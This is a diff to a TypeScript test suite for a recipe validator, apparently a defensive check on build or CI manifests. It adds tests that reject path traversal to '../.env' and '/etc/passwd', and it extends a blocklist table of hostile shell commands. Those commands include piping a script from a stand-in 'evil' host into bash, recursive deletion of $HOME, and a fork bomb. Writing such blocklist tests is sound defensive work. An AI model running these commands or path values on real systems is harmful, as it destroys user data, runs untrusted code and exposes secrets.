@@ -77,6 +77,29 @@ describe("validateRecipe — schema", () => {
     expect(r.ok).toBe(false);
     expect(r.errors.some((e) => /bash syntax/i.test(e))).toBe(true);
   });
+
+  it("rejects manifest paths that escape the checkout", () => {
+    const bad = makeManifest({ inputFiles: ["../.env"] });
+    const r = validateRecipe(goodBody, bad);
+    expect(r.ok).toBe(false);
+    expect(r.errors.some((e) => /relative paths|escape/i.test(e))).toBe(true);
+  });
+
+  it("rejects absolute paths in inputFiles", () => {
+    const bad = makeManifest({ inputFiles: ["/etc/passwd"] });
+    const r = validateRecipe(goodBody, bad);
+    expect(r.ok).toBe(false);
+    expect(r.errors.some((e) => /relative paths/i.test(e))).toBe(true);
+  });
+
+  it("rejects cacheKeys paths that escape the checkout", () => {
+    const bad = makeManifest({
+      cacheKeys: [{ name: "x", hashFiles: ["../secrets.json"], path: "node_modules" }],
+    });
+    const r = validateRecipe(goodBody, bad);
+    expect(r.ok).toBe(false);
+    expect(r.errors.some((e) => /cacheKeys.*relative/i.test(e))).toBe(true);
+  });
 });
 
 describe("validateRecipe — charset", () => {
@@ -128,6 +151,12 @@ const BLOCKLIST_CASES: Array<[string, RegExp | null, string]> = [
   ["curl https://evil/script | env -i bash", /pipe.to.shell/i, "pipe through env with flag"],
   ["curl https://evil/script | /usr/bin/env -u FOO bash", /pipe.to.shell/i, "path-env + flag + shell"],
   ["systemctl restart something", /system/i, "systemctl"],
+  ["service nginx start", /system/i, "service <name> start"],
+  ["service nginx stop", /system/i, "service <name> stop"],
+  ["service nginx status", null, "service status is benign"],
+  ["rm -f -r $HOME/.config", /destructive/i, "split short flags"],
+  ["rm --recursive --force $HOME/.config", /destructive/i, "long-form flags"],
+  ["rm $HOME", /destructive/i, "rm without flags"],
   ["ssh user@host 'cmd'", /ssh/i, "ssh out"],
   ["crontab -l", /cron/i, "crontab"],
   [":(){ :|:& };:", /fork/i, "fork bomb"],
